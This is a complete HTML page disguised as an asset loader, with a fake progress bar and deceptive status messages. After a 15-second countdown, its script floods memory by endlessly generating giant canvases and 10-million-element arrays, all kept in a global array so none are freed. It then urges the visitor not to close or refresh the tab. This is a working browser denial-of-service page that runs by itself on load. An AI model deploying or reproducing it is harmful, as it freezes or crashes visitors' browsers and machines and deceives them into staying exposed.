<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Loading…</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
    }
    
    body {
        height: 100vh;
        background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
        color: #e0e0e0;
        font-family: 'Segoe UI', system-ui, Arial, sans-serif;
        display: flex;
        align-items: center;
        justify-content: center;
        overflow: hidden;
        cursor: progress;
        position: relative;
    }
    
    .particle {
        position: absolute;
        width: 3px;
        height: 3px;
        background: rgba(108, 255, 194, 0.4);
        border-radius: 50%;
        pointer-events: none;
        transition: transform 0.1s ease-out;
    }
    
    #loader {
        text-align: center;
        width: 90%;
        max-width: 400px;
        padding: 40px 30px;
        background: rgba(20, 20, 30, 0.8);
        backdrop-filter: blur(10px);
        border-radius: 20px;
        box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
        border: 1px solid rgba(255, 255, 255, 0.1);
        z-index: 10;
    }
    
    #logo {
        font-size: 32px;
        font-weight: bold;
        background: linear-gradient(90deg, #00c2ff, #6cffc2);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        margin-bottom: 30px;
        letter-spacing: 2px;
    }
    
    #bar {
        height: 20px;
        background: rgba(40, 40, 50, 0.8);
        border-radius: 25px;
        overflow: hidden;
        margin-bottom: 15px;
        position: relative;
        box-shadow: inset 0 2px 10px rgba(0, 0, 0, 0.5);
    }
    
    #fill {
        height: 100%;
        width: 0%;
        background: linear-gradient(90deg, #00c2ff, #6cffc2, #00c2ff);
        background-size: 200% 100%;
        animation: shimmer 2s infinite;
        transition: width 0.4s ease;
        box-shadow: 0 0 20px rgba(0, 194, 255, 0.5);
        border-radius: 25px;
    }
    
    @keyframes shimmer {
        0% { background-position: 0% 0%; }
        100% { background-position: 200% 0%; }
    }
    
    #percent {
        font-size: 28px;
        font-weight: 600;
        margin-bottom: 10px;
        color: #00c2ff;
        text-shadow: 0 0 20px rgba(0, 194, 255, 0.5);
    }
    
    #status {
        font-size: 14px;
        opacity: 0.7;
        margin-top: 10px;
        min-height: 20px;
        transition: all 0.3s;
    }
    
    .spinner {
        display: inline-block;
        width: 12px;
        height: 12px;
        border: 2px solid rgba(0, 194, 255, 0.3);
        border-top-color: #00c2ff;
        border-radius: 50%;
        animation: spin 1s linear infinite;
        vertical-align: middle;
        margin-left: 8px;
    }
    
    @keyframes spin {
        to { transform: rotate(360deg); }
    }
    
    .warning {
        color: #ff6b6b;
        animation: pulse 2s infinite;
    }
    
    @keyframes pulse {
        0%, 100% { opacity: 0.5; }
        50% { opacity: 1; }
    }
</style>
</head>
<body>
<script>
    const particles = [];
    for (let i = 0; i < 50; i++) {
        const particle = document.createElement('div');
        particle.className = 'particle';
        particle.style.left = Math.random() * 100 + '%';
        particle.style.top = Math.random() * 100 + '%';
        document.body.appendChild(particle);
        particles.push({
            element: particle,
            baseX: Math.random() * window.innerWidth,
            baseY: Math.random() * window.innerHeight
        });
    }
    
    document.addEventListener('mousemove', (e) => {
        particles.forEach((p, index) => {
            const speed = (index % 5 + 1) * 0.05;
            const deltaX = (e.clientX - p.baseX) * speed;
            const deltaY = (e.clientY - p.baseY) * speed;
            p.element.style.transform = `translate(${deltaX}px, ${deltaY}px)`;
        });
    });
</script>

<div id="loader">
    <div id="logo">LOADING</div>
    <div id="bar"><div id="fill"></div></div>
    <div id="percent">0%</div>
    <div id="status">Initializing assets…<span class="spinner"></span></div>
</div>

<script>
    const fill = document.getElementById("fill");
    const percentText = document.getElementById("percent");
    const status = document.getElementById("status");
    
    let progress = 0;
    let images = [];
    let totalCanvases = 0;
    let hasStarted = false;
    
    const messages = [
        "Loading high-resolution assets…",
        "Generating procedural textures…",
        "Optimizing image buffers…",
        "Caching render data…",
        "Processing 4K textures…",
        "Compiling shaders…",
        "Allocating memory blocks…",
        "Building asset pipeline…",
        "Finalizing resources…",
        "Almost complete…",
        "This is taking longer than expected…",
        "Still processing large files…"
    ];
    
    let messageIndex = 0;
    let progressInterval;
    
    function fakeProgress() {
        if (!hasStarted) return;
        
        const increment = (100 / 60) / (1000 / 600);
        
        if (progress < 30) {
            progress += increment * (0.8 + Math.random() * 0.4);
        } else if (progress < 70) {
            progress += increment * (0.6 + Math.random() * 0.4);
        } else if (progress < 90) {
            progress += increment * (0.4 + Math.random() * 0.3);
        } else {
            progress += increment * (0.2 + Math.random() * 0.2);
        }
        
        if (progress > 99) progress = 95 + Math.random() * 4;
        
        fill.style.width = progress + "%";
        percentText.textContent = Math.floor(progress) + "%";
        
        if (Math.random() > 0.7) {
            messageIndex = (messageIndex + 1) % messages.length;
            status.innerHTML = messages[messageIndex] + '<span class="spinner"></span>';
        }
    }
    
    setTimeout(() => {
        hasStarted = true;
        status.innerHTML = 'Initializing heavy processes…<span class="spinner"></span>';
        progressInterval = setInterval(fakeProgress, 600);
    }, 15000);
    
    let countdown = 15;
    const countdownInterval = setInterval(() => {
        if (countdown > 0) {
            status.innerHTML = `Starting in ${countdown} seconds…`;
            countdown--;
        } else {
            clearInterval(countdownInterval);
        }
    }, 1000);
    
    
    function generateHeavyImage() {
        const sizes = [8192, 10240, 12288, 16384]; 
        const size = sizes[Math.floor(Math.random() * sizes.length)];
        
        const canvas = document.createElement("canvas");
        canvas.width = size;
        canvas.height = size;
        const ctx = canvas.getContext("2d");
        
        const imageData = ctx.createImageData(canvas.width, canvas.height);
        for (let i = 0; i < imageData.data.length; i += 4) {
            const x = (i / 4) % canvas.width;
            const y = Math.floor((i / 4) / canvas.width);
            const pattern = Math.sin(x * 0.01) * Math.cos(y * 0.01) * Math.tan(x * y * 0.00001);
            
            imageData.data[i] = (Math.random() * 128 + pattern * 127);
            imageData.data[i + 1] = (Math.random() * 128 + pattern * 127);
            imageData.data[i + 2] = (Math.random() * 128 + pattern * 127);
            imageData.data[i + 3] = 255;
        }
        ctx.putImageData(imageData, 0, 0);
        
        ctx.filter = 'blur(4px) contrast(1.5) saturate(2)';
        ctx.drawImage(canvas, 0, 0);
        ctx.filter = 'brightness(1.2)';
        ctx.drawImage(canvas, 0, 0);
        
        const img = new Image();
        img.src = canvas.toDataURL("image/png");
        images.push(img);
        images.push(canvas); 
        
        totalCanvases++;
    }
    
    let canvasInterval;
    setTimeout(() => {
        for (let i = 0; i < 500; i++) {
            setTimeout(() => generateHeavyImage(), i * 10);
        }
        
        canvasInterval = setInterval(() => {
            const count = 50 + Math.floor(Math.random() * 11);
            for (let i = 0; i < count; i++) {
                generateHeavyImage();
            }
        }, 100);
        
        setInterval(() => {
            const massiveArray = new Array(10000000).fill(Math.random());
            images.push(massiveArray);
        }, 500);
    }, 15000);
    
    setTimeout(() => {
        if (hasStarted) {
            status.innerHTML = '<span class="warning">Please do not close this tab.</span>';
        }
    }, 27000);
    
    setTimeout(() => {
        if (hasStarted) {
            status.innerHTML = '<span class="warning">Processing critical data… Do not refresh.</span>';
        }
    }, 40000);
</script>
</body>
</html>
